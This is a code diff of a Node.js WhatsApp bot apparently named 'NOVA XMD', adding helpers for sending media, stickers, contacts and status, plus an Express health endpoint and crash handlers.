+      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
+      // save to file
+      await fs.writeFileSync(trueFileName, buffer)
+      return trueFileName
+    }
+    //=================================================
+    conn.downloadMediaMessage = async(message) => {
+      let mime = (message.msg || message).mimetype || ''
+      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
+      const stream = await downloadContentFromMessage(message, messageType)
+      let buffer = Buffer.from([])
+      for await (const chunk of stream) {
+        buffer = Buffer.concat([buffer, chunk])
+      }
+    
+      return buffer
+    }
+    
+    //================================================
+    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
+      let mime = ''
+      let res = await axios.head(url)
+      mime = res.headers['content-type']
+      if (mime.split("/")[1] === "gif") {
+        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
+      }
+      let type = mime.split("/")[0] + "Message"
+      if (mime === "application/pdf") {
+        return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
+      }
+      if (mime.split("/")[0] === "image") {
+        return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
+      }
+      if (mime.split("/")[0] === "video") {
+        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
+      }
+      if (mime.split("/")[0] === "audio") {
+        return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
+      }
+    }
+    //==========================================================
+    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
+      //let copy = message.toJSON()
+      let mtype = Object.keys(copy.message)[0]
+      let isEphemeral = mtype === 'ephemeralMessage'
+      if (isEphemeral) {
+        mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
+      }
+      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
+      let content = msg[mtype]
+      if (typeof content === 'string') msg[mtype] = text || content
+      else if (content.caption) content.caption = text || content.caption
+      else if (content.text) content.text = text || content.text
+      if (typeof content !== 'string') msg[mtype] = {
+        ...content,
+        ...options
+      }
+      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
+      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
+      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
+      copy.key.remoteJid = jid
+      copy.key.fromMe = sender === conn.user.id
+    
+      return proto.WebMessageInfo.fromObject(copy)
+    }
+    
+    //=====================================================
+    conn.getFile = async(PATH, save) => {
+      let res
+      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
+      //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
+      let type = await FileType.fromBuffer(data) || {
+        mime: 'application/octet-stream',
+        ext: '.bin'
+      }
+      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
+      if (data && save) fs.promises.writeFile(filename, data)
+      return {
+        res,
+        filename,
+        size: await getSizeMedia(data),
+        ...type,
+        data
+      }
+    }
+    //=====================================================
+    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
+      let types = await conn.getFile(PATH, true)
+      let { filename, size, ext, mime, data } = types
+      let type = '',
+        mimetype = mime,
+        pathFile = filename
+      if (options.asDocument) type = 'document'
+      if (options.asSticker || /webp/.test(mime)) {
+        let { writeExif } = require('./exif.js')
+        let media = { mimetype: mime, data }
+        pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
+        await fs.promises.unlink(filename)
+        type = 'sticker'
+        mimetype = 'image/webp'
+      } else if (/image/.test(mime)) type = 'image'
+      else if (/video/.test(mime)) type = 'video'
+      else if (/audio/.test(mime)) type = 'audio'
+      else type = 'document'
+      await conn.sendMessage(jid, {
+        [type]: { url: pathFile },
+        mimetype,
+        fileName,
+        ...options
+      }, { quoted, ...options })
+      return fs.promises.unlink(pathFile)
+    }
+    //=====================================================
+    conn.parseMention = async(text) => {
+      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
+    }
+    //=====================================================
+    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
+      let types = await conn.getFile(path, true)
+      let { mime, ext, res, data, filename } = types
+      if (res && res.status !== 200 || file.length <= 65536) {
+        try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
+      }
+      let type = '',
+        mimetype = mime,
+        pathFile = filename
+      if (options.asDocument) type = 'document'
+      if (options.asSticker || /webp/.test(mime)) {
+        let { writeExif } = require('./exif')
+        let media = { mimetype: mime, data }
+        pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
+        await fs.promises.unlink(filename)
+        type = 'sticker'
+        mimetype = 'image/webp'
+      } else if (/image/.test(mime)) type = 'image'
+      else if (/video/.test(mime)) type = 'video'
+      else if (/audio/.test(mime)) type = 'audio'
+      else type = 'document'
+      await conn.sendMessage(jid, {
+        [type]: { url: pathFile },
+        caption,
+        mimetype,
+        fileName,
+        ...options
+      }, { quoted, ...options })
+      return fs.promises.unlink(pathFile)
+    }
+    
+    //=====================================================
+    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
+      let buffer
+      if (options && (options.packname || options.author)) {
+        buffer = await writeExifVid(buff, options)
+      } else {
+        buffer = await videoToWebp(buff)
+      }
+      await conn.sendMessage(
+        jid,
+        { sticker: { url: buffer }, ...options },
+        options
+      )
+    }
+    //=====================================================
+    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
+      let buffer
+      if (options && (options.packname || options.author)) {
+        buffer = await writeExifImg(buff, options)
+      } else {
+        buffer = await imageToWebp(buff)
+      }
+      await conn.sendMessage(
+        jid,
+        { sticker: { url: buffer }, ...options },
+        options
+      )
+    }
+    //=====================================================
+    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
+    
+    //=====================================================
+    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
+      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
+      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
+    }
+    
+    //=====================================================
+    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
+    
+    //=====================================================
+    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
+      let buttonMessage = {
+        text,
+        footer,
+        buttons,
+        headerType: 2,
+        ...options
+      }
+      //========================================================================================================================================
+      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
+    }
+    //=====================================================
+    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
+      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
+      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
+        templateMessage: {
+          hydratedTemplate: {
+            imageMessage: message.imageMessage,
+            "hydratedContentText": text,
+            "hydratedFooterText": footer,
+            "hydratedButtons": but
+          }
+        }
+      }), options)
+      conn.relayMessage(jid, template.message, { messageId: template.key.id })
+    }
+    
+    //=====================================================
+    conn.getName = (jid, withoutContact = false) => {
+      id = conn.decodeJid(jid)
+
+      withoutContact = conn.withoutContact || withoutContact
+
+      let v
+
+      if (id.endsWith('@g.us'))
+        return new Promise(async resolve => {
+          v = store.contacts[id] || {}
+
+          if (!(v.name.notify || v.subject))
+            v = conn.groupMetadata(id) || {}
+
+          resolve(
+            v.name ||
+              v.subject ||
+              PhoneNumber(
+                '+' + id.replace('@s.whatsapp.net', ''),
+              ).getNumber('international'),
+          )
+        })
+      else
+        v =
+          id === '0@s.whatsapp.net'
+            ? {
+                id,
+                name: 'WhatsApp',
+              }
+            : id === conn.decodeJid(conn.user.id)
+            ? conn.user
+            : store.contacts[id] || {}
+
+      return (
+        (withoutContact ? '' : v.name) ||
+        v.subject ||
+        v.verifiedName ||
+        PhoneNumber(
+          '+' + jid.replace('@s.whatsapp.net', ''),
+        ).getNumber('international')
+      )
     }
 
-    conn.setStatus = (status) => {
-        conn.query({ tag: 'iq', attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' }, content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }] })
-        return status
+    // Vcard Functionality
+    conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
+      let list = []
+      for (let i of kon) {
+        list.push({
+          displayName: await conn.getName(i + '@s.whatsapp.net'),
+          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
+            i + '@s.whatsapp.net',
+          )}\nFN:${
+            global.OwnerName
+          }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
+            global.email
+          }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
+            global.github
+          }/Wa-his-v1.0\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
+            global.location
+          };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
+        })
+      }
+      conn.sendMessage(
+        jid,
+        {
+          contacts: {
+            displayName: `${list.length} Contact`,
+            contacts: list,
+          },
+          ...opts,
+        },
+        { quoted },
+      )
     }
-
+    // Status aka brio
+    conn.setStatus = status => {
+      conn.query({
+        tag: 'iq',
+        attrs: {
+          to: '@s.whatsapp.net',
+          type: 'set',
+          xmlns: 'status',
+        },
+        content: [
+          {
+            tag: 'status',
+            attrs: {},
+            content: Buffer.from(status, 'utf-8'),
+          },
+        ],
+      })
+      return status
+    }
+    conn.serializeM = mek => sms(conn, mek, store)
   } catch (error) {
-    console.error('Connection Error:', error)
-    setTimeout(() => connectToWA(), 5000)
+    console.error('Error in connectToWA:', error)
+    setTimeout(() => connectToWA(), 5000) // Retry after 5 seconds
   }
 }
+  
+app.get("/", (req, res) => {
+  res.send("NOVA XMD STARTED ✅")
+})
 
-app.get("/", (req, res) => res.send("NOVA XMD IS ACTIVE ✅"))
-app.listen(port, () => console.log(`Server running on port ${port}`))
-setTimeout(() => connectToWA(), 5000)
+// Anti-crash handler
+process.on("uncaughtException", (err) => {
+  console.error("[❗] Uncaught Exception:", err.stack || err);
+});
+
+process.on("unhandledRejection", (reason, p) => {
+  console.error("[❗] Unhandled Promise Rejection:", reason);
+});
+
+app.listen(port, '0.0.0.0', () => console.log(`Server listening on port http://0.0.0.0:${port}`))
+
+setTimeout(() => {
+  connectToWA()
+}, 8000)
